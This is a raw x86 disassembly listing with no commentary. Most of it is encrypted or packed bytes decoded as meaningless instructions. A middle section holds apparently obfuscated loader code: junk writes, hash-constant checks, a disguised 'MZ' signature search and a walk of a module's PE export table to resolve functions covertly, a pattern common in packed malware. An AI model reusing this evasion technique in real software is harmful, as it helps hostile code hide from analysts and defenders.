  41df00:	ins    DWORD PTR es:[edi],dx
  41df01:	dec    DWORD PTR [ebx+0x2d]
  41df04:	adc    eax,0xd5166616
  41df09:	stos   BYTE PTR es:[edi],al
  41df0a:	adc    DWORD PTR [ebx+0x6e],edx
  41df0d:	pop    ss
  41df0e:	cmp    edi,DWORD PTR [esi]
  41df10:	fmul   st,st(2)
  41df12:	mov    esi,0x5dfbd4a5
  41df17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df18:	pop    edx
  41df19:	in     eax,0x4
  41df1b:	int    0x72
  41df1d:	inc    eax
  41df1e:	pop    ebp
  41df1f:	or     dh,dl
  41df21:	clc    
  41df22:	aam    0xcf
  41df24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df25:	lock ds mov ah,0x4c
  41df29:	outs   dx,DWORD PTR ds:[esi]
  41df2a:	push   ecx
  41df2b:	dec    eax
  41df2c:	sub    bl,ch
  41df2e:	daa    
  41df2f:	jnp    0x41df38
  41df31:	push   ds
  41df32:	out    dx,eax
  41df33:	clc    
  41df34:	repnz cmc 
  41df36:	and    eax,0x21f25a89
  41df3b:	jns    0x41def0
  41df3d:	je     0x41df97
  41df3f:	imul   edx,DWORD PTR [ebx],0xffffff98
  41df42:	add    ch,0xd1
  41df45:	mov    fs,WORD PTR [edi+0x52bd55e1]
  41df4b:	fwait
  41df4c:	xchg   esi,eax
  41df4d:	das    
  41df4e:	ficom  DWORD PTR [edi+ebx*2-0x329e1887]
  41df55:	mov    ah,0x82
  41df57:	sub    BYTE PTR [ebx+ebx*1],bl
  41df5a:	xor    BYTE PTR [edx-0x16d0b2f7],bh
  41df60:	push   ebx
  41df61:	out    dx,al
  41df62:	pop    esi
  41df63:	or     BYTE PTR [ecx-0x260d7adf],0xaa
  41df6a:	push   cs
  41df6b:	mov    eax,0x8b8c9156
  41df70:	or     ebp,DWORD PTR [ebx+edi*8+0x4154c179]
  41df77:	mov    ds,WORD PTR [esi+edi*4-0x42]
  41df7b:	pop    ecx
  41df7c:	push   es
  41df7d:	adc    al,BYTE PTR [ebp+0xc]
  41df80:	sbb    eax,edi
  41df82:	ror    DWORD PTR [edi+0x1e],0xa9
  41df86:	mov    eax,0x2f901ff0
  41df8b:	jle    0x41df8f
  41df8d:	mov    edi,0x1406fa7f
  41df92:	add    eax,0x4028e8e1
  41df97:	shl    dh,0x5f
  41df9a:	inc    ecx
  41df9b:	jnp    0x41e008
  41df9d:	in     al,0xb4
  41df9f:	sub    DWORD PTR [ebx+0x77],0x62c00c3
  41dfa6:	neg    esi
  41dfa8:	xchg   edi,eax
  41dfa9:	mov    cl,0xb5
  41dfab:	sahf   
  41dfac:	cwde   
  41dfad:	sub    al,0xbc
  41dfaf:	xchg   esp,eax
  41dfb0:	add    eax,0x16b24e2a
  41dfb5:	jg     0x41df9e
  41dfb7:	stos   BYTE PTR es:[edi],al
  41dfb8:	mov    esi,0xd805a876
  41dfbd:	xor    ah,cl
  41dfbf:	(bad)  
  41dfc0:	pop    ds
  41dfc1:	jns    0x41e02d
  41dfc3:	lahf   
  41dfc4:	lock dec esp
  41dfc6:	cwde   
  41dfc7:	int    0x90
  41dfc9:	in     al,0x1e
  41dfcb:	scas   al,BYTE PTR es:[edi]
  41dfcc:	pop    esp
  41dfcd:	inc    edx
  41dfce:	lea    ecx,[edx-0x28]
  41dfd1:	int3   
  41dfd2:	mov    ecx,0xde4fe8ee
  41dfd7:	in     eax,0x4e
  41dfd9:	sbb    DWORD PTR [ebp+edi*4-0x36],esi
  41dfdd:	or     eax,0xcbfdf65a
  41dfe2:	out    dx,eax
  41dfe3:	cmc    
  41dfe4:	pop    edi
  41dfe5:	(bad)  
  41dfe6:	in     eax,dx
  41dfe7:	jb     0x41dfd3
  41dfe9:	inc    esp
  41dfea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfeb:	xchg   edx,eax
  41dfec:	adc    eax,DWORD PTR [ecx]
  41dfee:	aaa    
  41dfef:	or     BYTE PTR [ebx],dh
  41dff1:	jns    0x41e034
  41dff3:	push   ebx
  41dff4:	inc    BYTE PTR [edi-0x37]
  41dff7:	out    dx,eax
  41dff8:	sbb    BYTE PTR [edx-0x4],dh
  41dffb:	xor    BYTE PTR [edi],0xd7
  41dffe:	jno    0x41dfa1
  41e000:	ins    DWORD PTR es:[edi],dx
  41e001:	test   DWORD PTR [esi*8-0x71073846],edx
  41e008:	out    0xb6,al
  41e00a:	xchg   esp,eax
  41e00b:	or     DWORD PTR [ecx-0x20],ebp
  41e00e:	mov    ebx,0x7aad4582
  41e013:	mov    ebp,0xcad3e65b
  41e018:	or     eax,0x65e4e5c
  41e01d:	fsub   QWORD PTR [esi-0x1202c441]
  41e023:	das    
  41e024:	jo     0x41dfd1
  41e026:	les    ebx,FWORD PTR [eax]
  41e028:	mov    ecx,ebp
  41e02a:	ret    
  41e02b:	dec    esp
  41e02c:	repz sbb al,0x67
  41e02f:	stc    
  41e030:	jmp    DWORD PTR [ebp+0x5b455e97]
  41e036:	idiv   DWORD PTR [edx]
  41e038:	ins    BYTE PTR es:[edi],dx
  41e039:	ss mov bh,0x2c
  41e03c:	or     al,0x39
  41e03e:	xor    cl,BYTE PTR [esi-0x6e7e94ff]
  41e044:	and    eax,0x84a697e6
  41e049:	xor    edx,edx
  41e04b:	xchg   BYTE PTR [edx+0x69307c84],dh
  41e051:	test   eax,0xe0f65c58
  41e056:	call   0xd209:0x8f19e785
  41e05d:	or     BYTE PTR [esp+edx*4+0x31211686],0x46
  41e065:	rol    DWORD PTR ds:0xd871b9ea,1
  41e06b:	mov    dh,0xed
  41e06d:	(bad)  
  41e06e:	adc    al,0x55
  41e070:	sub    eax,0x8debe988
  41e075:	retf   
  41e076:	fisubr WORD PTR [ecx+0x73]
  41e079:	test   BYTE PTR [ecx-0x413dea38],al
  41e07f:	mov    ds:0x24ed90f3,al
  41e084:	mov    bl,0x8d
  41e086:	dec    eax
  41e087:	add    eax,0x1a0235f
  41e08c:	dec    edi
  41e08d:	or     ebx,edi
  41e08f:	dec    eax
  41e090:	ret    
  41e091:	fsubr  DWORD PTR [ebx+0xe]
  41e094:	les    esi,FWORD PTR [edx+0x8]
  41e097:	out    0xdd,eax
  41e099:	sub    BYTE PTR [edx-0x1e0d6dc4],bl
  41e09f:	ret    
  41e0a0:	iret   
  41e0a1:	or     eax,0xbb0b3219
  41e0a6:	clc    
  41e0a7:	scas   eax,DWORD PTR es:[edi]
  41e0a8:	daa    
  41e0a9:	pop    ebp
  41e0aa:	rcr    BYTE PTR [esi-0x6e],1
  41e0ad:	(bad)
  41e0b0:	and    BYTE PTR [eax-0x52],dl
  41e0b3:	fdivp  st(6),st
  41e0b5:	imul   edx,eax,0xffffffa2
  41e0b8:	mov    al,0x7b
  41e0ba:	cmp    eax,0x70941f91
  41e0bf:	mov    DWORD PTR ds:0x428e3f,0x1354
  41e0c9:	jne    0x41e100
  41e0cf:	cmp    esi,ebx
  41e0d1:	mov    DWORD PTR ds:0x428e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x428e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x428e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x428eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x428ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x428e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x428e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x428e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x428e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x428ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x428ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x428e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x428e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x428e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x428e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x428e67,0x61b3
  41e1d2:	cmp    esi,ebx
  41e1d4:	mov    DWORD PTR ds:0x428e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x428e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x428eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	data16 jno 0x41e3de
  41e385:	stos   DWORD PTR es:[edi],eax
  41e386:	in     eax,0xcb
  41e388:	fiadd  DWORD PTR [edx-0x7c9fd87d]
  41e38e:	and    DWORD PTR [ebp-0x35],0xffffffa6
  41e392:	daa    
  41e393:	dec    ebp
  41e394:	dec    edi
  41e395:	jb     0x41e34c
  41e397:	mov    dh,0xd3
  41e399:	cwde   
  41e39a:	test   al,0xe9
  41e39c:	mov    dl,0x21
  41e39e:	pop    edx
  41e39f:	sbb    bl,BYTE PTR [esi-0x3b]
  41e3a2:	js     0x41e3dc
  41e3a4:	ins    BYTE PTR es:[edi],dx
  41e3a5:	clc    
  41e3a6:	cmp    eax,0xf50c78c
  41e3ab:	mov    ah,0x50
  41e3ad:	push   0x305e4aaf
  41e3b2:	mov    ds:0x74c6c832,al
  41e3b7:	jl     0x41e34f
  41e3b9:	push   0xffffffc9
  41e3bb:	les    edi,FWORD PTR [ecx-0x24e5cb9d]
  41e3c1:	sbb    eax,0x9321e901
  41e3c6:	cwde   
  41e3c7:	outs   dx,BYTE PTR ds:[esi]
  41e3c8:	(bad)  
  41e3c9:	push   ss
  41e3ca:	shl    al,1
  41e3cc:	push   0xacd24bf0
  41e3d1:	es iretw 
  41e3d4:	push   edx
  41e3d5:	sbb    cl,BYTE PTR [edx]
  41e3d7:	leavew 
  41e3d9:	and    cl,cl
  41e3db:	or     DWORD PTR [ebp-0x36],esi
  41e3de:	inc    ecx
  41e3df:	push   ebp
  41e3e0:	ror    cl,cl
  41e3e2:	cmp    bh,bh
  41e3e4:	xchg   ebp,eax
  41e3e5:	popa   
  41e3e6:	ss ror al,1
  41e3e9:	or     DWORD PTR [esi-0xe],ecx
  41e3ec:	jno    0x41e416
  41e3ee:	jo     0x41e41d
  41e3f0:	mov    al,ds:0xbf47bb6b
  41e3f5:	outs   dx,DWORD PTR ds:[esi]
  41e3f6:	mov    bh,0x66
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	call   0xb15a:0x6692cf68
  41e400:	inc    eax
  41e401:	sbb    DWORD PTR [ebx+0x28],0xa59bb048
  41e408:	(bad)  
  41e409:	aaa    
  41e40a:	add    eax,edi
  41e40c:	and    DWORD PTR [edi+eax*8],esi
  41e40f:	push   ds
  41e410:	jmp    0x41e40c
  41e412:	and    al,0xed
  41e414:	fisttp DWORD PTR [edx-0x5]
  41e417:	and    eax,0xa8de18a9
  41e41c:	and    dl,BYTE PTR [edx]
  41e41e:	mov    ds:0x88e8c1a4,eax
  41e423:	dec    DWORD PTR [edi]
  41e425:	cmp    eax,0x75ddcec2
  41e42a:	mov    eax,ds:0xb5a76d4
  41e42f:	mov    ds:0xf2a32968,al
  41e434:	and    ch,BYTE PTR [ebx+0x6027a5c5]
  41e43a:	fwait
  41e43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e43c:	sub    DWORD PTR [ebx+0x3d],edx
  41e43f:	jl     0x41e4ae
  41e441:	mov    edi,0x7f6ad91f
  41e446:	repz es aas 
  41e449:	dec    esp
  41e44a:	jp     0x41e459
  41e44c:	(bad)  
  41e44d:	jmp    0xa58d:0xb05a6e6d
  41e454:	ficom  DWORD PTR [ecx]
  41e456:	pop    ss
  41e457:	pop    eax
  41e459:	xchg   ebp,eax
  41e45a:	sub    esp,ecx
  41e45c:	push   ebx
  41e45d:	fadd   st(4),st
  41e45f:	daa    
  41e460:	mov    ch,0x8a
  41e462:	dec    eax
  41e463:	mov    ds:0xbc99c11e,al
  41e468:	cmp    DWORD PTR [edi+edx*2],ecx
  41e46b:	xchg   DWORD PTR [edx+0x1],ebp
  41e46e:	fisttp WORD PTR [ebx-0x1613ec0]
  41e474:	mov    al,ds:0xfa11cde2
  41e479:	in     eax,0x8c
  41e47b:	repnz (bad) 
  41e47d:	(bad)  
  41e47e:	into   
  41e47f:	add    eax,0x55e15bb2
  41e484:	push   edx
  41e485:	shl    DWORD PTR [eax],0x6e
  41e488:	nop
  41e489:	rcr    DWORD PTR [esi-0x76],1
  41e48c:	aad    0xcd
  41e48e:	mov    ds:0xc25a5c42,eax
  41e493:	push   cs
  41e494:	clc    
  41e495:	js     0x41e480
  41e497:	ret    0x65b
  41e49a:	icebp  
  41e49b:	sbb    al,0x65
  41e49d:	enter  0xe3d7,0x4b
  41e4a1:	push   ebx
  41e4a2:	stos   BYTE PTR es:[edi],al
  41e4a3:	xor    edx,edx
  41e4a5:	sub    ah,BYTE PTR ds:0x3cca0142
  41e4ab:	adc    ebx,DWORD PTR [edi+0x10]
  41e4ae:	sub    DWORD PTR [edx+0x47],ebx
  41e4b1:	outs   dx,DWORD PTR ds:[esi]
  41e4b2:	ins    BYTE PTR es:[edi],dx
  41e4b3:	push   cs
  41e4b4:	rcl    BYTE PTR [edi],0x97
  41e4b7:	sub    BYTE PTR [edx],dl
  41e4b9:	mov    bh,0x77
  41e4bb:	pop    ebp
  41e4bc:	das    
  41e4bd:	jne    0x41e502
  41e4bf:	push   ebp
  41e4c0:	jbe    0x41e442
  41e4c2:	pop    esp
  41e4c3:	out    dx,al
  41e4c4:	mov    DWORD PTR ds:0x77a1c740,ecx
  41e4ca:	fisub  WORD PTR ds:0xda9953af
  41e4d0:	sar    BYTE PTR [ecx-0x5b],cl
  41e4d3:	inc    ebp
  41e4d4:	jl     0x41e4e5
  41e4d6:	sar    BYTE PTR [edx-0x35],1
  41e4d9:	mov    bl,0x4e
  41e4db:	test   al,0x22
  41e4dd:	fwait
  41e4de:	cmp    al,0x52
  41e4e0:	pop    edx
  41e4e1:	test   ax,0x12e6
  41e4e5:	pusha  
  41e4e6:	adc    al,0xd2
  41e4e8:	sbb    al,0x90
  41e4ea:	leave  
  41e4eb:	sbb    al,0x99
  41e4ed:	adc    BYTE PTR [eax+edx*2+0x345cb780],dh
  41e4f4:	mov    ebx,0xb3af1ecc
  41e4f9:	inc    edx
  41e4fa:	ins    BYTE PTR es:[edi],dx
  41e4fb:	xchg   edi,eax
  41e4fc:	cmp    al,0x48
  41e4fe:	mov    dl,0x20
  41e500:	shl    DWORD PTR [eax+0x7b9a19c9],cl
  41e506:	enter  0x68da,0x80
  41e50a:	xor    eax,0xad76d6
  41e50f:	int3   
  41e510:	lock fidivr DWORD PTR [ebp+0x70]
  41e514:	les    esi,FWORD PTR [eax-0x1b16bd23]
  41e51a:	fsubr  QWORD PTR [esi-0x53]
  41e51d:	stos   BYTE PTR es:[edi],al
  41e51e:	cmp    DWORD PTR [esi],eax
  41e520:	xor    al,0x23
  41e522:	xlat   BYTE PTR ds:[ebx]
  41e523:	lods   al,BYTE PTR ds:[esi]
  41e524:	and    ebp,DWORD PTR [ebx+0x5e2c4f55]
  41e52a:	imul   edx,DWORD PTR [esi],0xc4cd2a9b
  41e530:	and    al,bh
  41e532:	adc    DWORD PTR [edi],eax
  41e534:	repnz or al,0x39
  41e537:	push   esi
  41e538:	adc    esi,DWORD PTR [edi]
  41e53a:	sub    ecx,DWORD PTR [ebp-0x6a]
  41e53d:	mov    ds:0xf0e89452,eax
  41e542:	fsubp  st(6),st
  41e544:	cwde   
  41e545:	(bad)  
  41e547:	jp     0x41e5b2
  41e549:	in     al,0xa1
  41e54b:	mov    eax,ds:0x29a9a1ee
  41e550:	or     BYTE PTR ds:0x3206b769,dl
  41e556:	push   eax
  41e557:	nop
  41e558:	push   es
  41e559:	cld    
  41e55a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e55b:	sbb    al,BYTE PTR [eax]
  41e55d:	adc    eax,edi
  41e55f:	jb     0xc5d38a8d
  41e565:	push   ecx
  41e566:	out    0x0,al
  41e568:	gs push edi
  41e56a:	pop    ss
  41e56b:	stos   BYTE PTR es:[edi],al
  41e56c:	dec    edx
  41e56d:	cmc    
  41e56e:	sub    BYTE PTR [ebx-0x64],0x74
  41e572:	xlat   BYTE PTR ds:[ebx]
  41e573:	cmp    DWORD PTR [edi+0xf],0xd696c69
  41e57a:	add    ebx,DWORD PTR [ebp+0x60]
  41e57d:	sti    
  41e57e:	pop    ebx
  41e57f:	sbb    ebp,edx
  41e581:	imul   edx,edi,0x24
  41e584:	test   BYTE PTR [ecx-0x51],ah
  41e587:	xor    eax,0x988ac59d
  41e58c:	adc    al,0x9b
  41e58e:	mov    ch,0x17
  41e590:	(bad)  
  41e591:	jae    0x41e54c
  41e593:	(bad)  [ecx+0x121c12fe]
  41e599:	pop    es
  41e59a:	lmsw   WORD PTR [ecx+0x16d93b35]
  41e5a1:	dec    ecx
  41e5a2:	sub    DWORD PTR [ebp-0x59e26dd2],edi
  41e5a8:	(bad)  
  41e5a9:	adc    edi,DWORD PTR [ebx+0x31]
  41e5ac:	mov    ?,edx
  41e5ae:	jl     0x41e599
  41e5b0:	stos   BYTE PTR es:[edi],al
  41e5b1:	and    eax,0x20e5456e
  41e5b6:	jmp    0x41e5f7
  41e5b8:	cli    
  41e5b9:	ret    
  41e5ba:	aad    0x8d
  41e5bc:	(bad)  
  41e5bd:	icebp  
  41e5be:	mov    dl,0xe9
  41e5c0:	jle    0x41e577
  41e5c2:	add    al,0xbc
  41e5c4:	aam    0xca
  41e5c6:	push   eax
  41e5c7:	inc    ch
  41e5c9:	pop    esp
  41e5ca:	pop    ds
  41e5cb:	add    al,ch
  41e5cd:	call   0x844a00e3
  41e5d2:	lahf   
  41e5d3:	or     DWORD PTR [esi-0x428c8056],0x851c2325
  41e5dd:	das    
  41e5de:	call   0x2d434f1a
  41e5e3:	fidivr DWORD PTR [eax-0x40d4bbb1]
  41e5e9:	pop    esi
  41e5ea:	(bad)  
  41e5eb:	bound  eax,QWORD PTR [ebx-0x87ab116]
  41e5f1:	mov    ebx,DWORD PTR [ebx]
  41e5f3:	push   ebp
  41e5f4:	aas    
  41e5f5:	push   ds
  41e5f6:	lea    edx,[ebx]
  41e5f8:	cmp    al,dh
  41e5fa:	fst    st(0)
  41e5fc:	scas   eax,DWORD PTR es:[edi]
  41e5fd:	and    esi,ebp
  41e5ff:	sub    edx,DWORD PTR [edi]
  41e601:	sbb    BYTE PTR [edx-0x2f9b847b],ch
  41e607:	mov    edx,0x100bda31
  41e60c:	dec    edx
  41e60d:	outs   dx,BYTE PTR ds:[esi]
  41e60e:	pop    ebp
  41e60f:	loopne 0x41e5c4
  41e611:	addr16 out dx,eax
  41e613:	pop    ebx
  41e614:	stos   BYTE PTR es:[edi],al
  41e615:	or     al,0x21
  41e617:	pop    ebx
  41e618:	(bad)  
  41e619:	fild   WORD PTR [ebx+0x6]
  41e61c:	push   esp
  41e61d:	stc    
  41e61e:	clc    
  41e61f:	or     DWORD PTR [bx+di],esp
  41e622:	or     al,0x7d
  41e624:	mov    cl,0xfb
  41e626:	and    eax,0xea8b4aac
  41e62b:	ins    BYTE PTR es:[edi],dx
  41e62c:	sbb    eax,0x66893c12
  41e631:	mov    ds:0x50ed1ddd,eax
  41e636:	mov    DWORD PTR [ecx+edi*4+0x444b4311],ebx
  41e63d:	cmp    DWORD PTR [esp+ecx*4-0x44],eax
  41e641:	imul   eax,DWORD PTR [ebx+0x7f],0xaf11d0b1
  41e648:	fcomp  QWORD PTR [edx+0x50daa3a4]
  41e64e:	stc    
  41e64f:	ins    BYTE PTR es:[edi],dx
  41e650:	mov    ebp,0x54088c12
  41e655:	stos   BYTE PTR es:[edi],al
  41e656:	cmp    DWORD PTR [eax],ecx
  41e658:	or     eax,0x3da686d2
  41e65d:	fidiv  DWORD PTR [ecx-0x6bfebdab]
  41e663:	or     BYTE PTR [ebx-0x6e],0x27
  41e667:	pop    ecx
  41e668:	leave  
  41e669:	ja     0x41e6b4
  41e66b:	pop    ebx
  41e66c:	(bad)  
  41e66d:	call   0x9e0a:0xfb00a637
  41e674:	fidiv  WORD PTR [ebp-0x78b829b2]
  41e67a:	push   ecx
  41e67b:	jmp    0x41e673
  41e67d:	pop    DWORD PTR [eax+0x42e91239]
  41e683:	outs   dx,DWORD PTR ds:[esi]
  41e684:	(bad)  
  41e685:	jae    0x41e6e9
  41e687:	or     al,0x3c
  41e689:	lods   al,BYTE PTR ds:[esi]
  41e68a:	cmp    dl,BYTE PTR [ebp-0x26faece0]
  41e690:	cmp    al,0x1f
  41e692:	inc    ecx
  41e693:	adc    esp,DWORD PTR [ecx]
  41e695:	or     eax,0xfdc3f6d8
  41e69a:	int    0xec
  41e69c:	int3   
  41e69d:	push   ecx
  41e69e:	sub    DWORD PTR [edx],esi
  41e6a0:	int3   
  41e6a1:	or     al,0x80
  41e6a3:	add    eax,0x8e6a56d5
  41e6a8:	xlat   BYTE PTR ds:[ebx]
  41e6a9:	lahf   
  41e6aa:	inc    ebp
  41e6ab:	call   0x90d26994
  41e6b0:	popa   
  41e6b1:	mov    eax,edi
  41e6b3:	mov    ecx,0xf118683a
  41e6b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6b9:	neg    BYTE PTR [edi+0x72025990]
  41e6bf:	mov    DWORD PTR [esi+0xffaa356],0xeb9654ea
  41e6c9:	sub    cl,ch
  41e6cb:	int3   
  41e6cc:	jmp    0x41e6a0
  41e6ce:	inc    ebp
  41e6cf:	adc    cl,bl
  41e6d1:	mov    dl,0x86
  41e6d3:	popf   
  41e6d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6d5:	mov    BYTE PTR [eax-0x2],ah
  41e6d8:	arpl   WORD PTR [eax],sp
  41e6da:	das    
  41e6db:	in     al,dx
  41e6dc:	iret   
  41e6dd:	int    0xad
  41e6df:	sub    esi,DWORD PTR [edi+ecx*2-0x5d]
  41e6e3:	ja     0x41e6be
  41e6e5:	not    DWORD PTR [ecx-0x38fe055c]
  41e6eb:	or     eax,0x85eb5d76
  41e6f0:	mov    eax,ds:0x8688bc2
  41e6f5:	mov    dh,0xcf
  41e6f7:	jb     0x41e67c
  41e6f9:	cld    
  41e6fa:	call   0xe61b:0xd75af626
  41e701:	shl    DWORD PTR ds:0xcca949b2,0x5b
  41e708:	out    dx,al
  41e709:	popa   
  41e70a:	xor    eax,0xd134605
  41e70f:	sbb    DWORD PTR [ebx],eax
  41e711:	out    dx,al
  41e712:	fiadd  DWORD PTR [edx+edx*8+0x47016b04]
  41e719:	cmp    cl,cl
  41e71b:	mov    al,0xbe
  41e71d:	pop    edi
  41e71e:	jns    0x41e6e3
  41e720:	(bad)  
  41e721:	shl    BYTE PTR [eax-0x52],1
  41e724:	xchg   edi,eax
  41e725:	push   ebx
  41e726:	mov    BYTE PTR [esi],0x12
  41e729:	outs   dx,BYTE PTR ds:[esi]
  41e72a:	aaa    
  41e72b:	mov    bl,0x65
  41e72d:	push   edx
  41e72e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e72f:	jbe    0x41e6e1
  41e731:	stc    
  41e732:	dec    eax
  41e733:	hlt    
  41e734:	in     al,dx
  41e735:	push   es
  41e736:	lahf   
  41e737:	xchg   eax,ecx
  41e739:	adc    BYTE PTR [ebx],ah
